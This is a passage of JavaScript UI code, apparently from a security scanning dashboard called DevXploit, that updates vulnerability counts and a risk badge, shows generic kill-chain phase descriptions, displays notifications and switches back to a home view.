        Object.entries(countElements).forEach(([elementId, count]) => {
            const element = document.getElementById(elementId);
            if (element) {
                element.textContent = count;
            }
        });

        // Update the overall stats display
        this.updateOverallStats(severity);
    }

    updateOverallStats(severity) {
        // Update the scan mode badge based on vulnerability count
        const modeBadge = document.getElementById('modeBadge');
        if (modeBadge && severity.totalVulnerabilities > 0) {
            const riskLevel = severity.score >= 75 ? 'Low Risk' : 
                            severity.score >= 50 ? 'Medium Risk' : 'High Risk';
            
            const riskColor = severity.score >= 75 ? 'text-emerald-400' : 
                            severity.score >= 50 ? 'text-amber-400' : 'text-red-400';
            
            modeBadge.innerHTML = `
                <span class="h-1.5 w-1.5 rounded-full ${severity.score >= 75 ? 'bg-emerald-500' : severity.score >= 50 ? 'bg-amber-500' : 'bg-red-500'}"></span>
                <span class="${riskColor}">${riskLevel}</span>
            `;
        }
    }

    initializeKillChainInteraction() {
        const killChainNodes = document.querySelectorAll('[data-phase]');
        killChainNodes.forEach(node => {
            node.addEventListener('click', (e) => {
                const phase = e.currentTarget.getAttribute('data-phase');
                this.showPhaseDetails(phase);
            });
        });
    }

    showPhaseDetails(phase) {
        // Highlight selected node
        document.querySelectorAll('[data-phase]').forEach(node => {
            const circle = node.querySelector('circle:last-child');
            if (node.getAttribute('data-phase') === phase) {
                circle.style.strokeWidth = '4';
            } else {
                circle.style.strokeWidth = '2';
            }
        });

        // Show phase-specific details
        const phaseDetails = {
            'recon': 'Reconnaissance phase involves gathering information about the target',
            'enum': 'Enumeration focuses on identifying specific vulnerabilities and entry points',
            'vuln': 'Vulnerability analysis reveals exploitable security weaknesses',
            'exploit': 'Exploitation phase demonstrates how attackers compromise the system',
            'post': 'Post-exploitation covers privilege escalation and persistence techniques'
        };

        this.showNotification(phaseDetails[phase] || 'Phase details', 'info');
    }

    showNotification(message, type = 'info') {
        // Create notification element
        const notification = document.createElement('div');
        notification.className = `fixed top-4 right-4 z-50 p-4 rounded-lg shadow-lg max-w-sm transition-all transform translate-x-full`;
        
        const colors = {
            success: 'bg-emerald-900 border border-emerald-700 text-emerald-100',
            error: 'bg-red-900 border border-red-700 text-red-100',
            info: 'bg-blue-900 border border-blue-700 text-blue-100'
        };
        
        notification.className += ` ${colors[type] || colors.info}`;
        notification.textContent = message;
        
        document.body.appendChild(notification);
        
        // Animate in
        setTimeout(() => {
            notification.style.transform = 'translateX(0)';
        }, 100);
        
        // Auto remove after 5 seconds
        setTimeout(() => {
            notification.style.transform = 'translateX(100%)';
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.parentNode.removeChild(notification);
                }
            }, 300);
        }, 5000);
    }

    // Return to home view
    goHome() {
        const homeView = document.getElementById('homeView');
        const dashboardView = document.getElementById('dashboardView');
        
        if (homeView) homeView.style.display = 'block';
        if (dashboardView) dashboardView.classList.add('hidden');
        
        // Clear current scan
        this.currentScanId = null;
        if (this.scanInterval) {
            clearInterval(this.scanInterval);
        }
    }
}

// Initialize dashboard when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.devxploit = new DevXploitDashboard();
});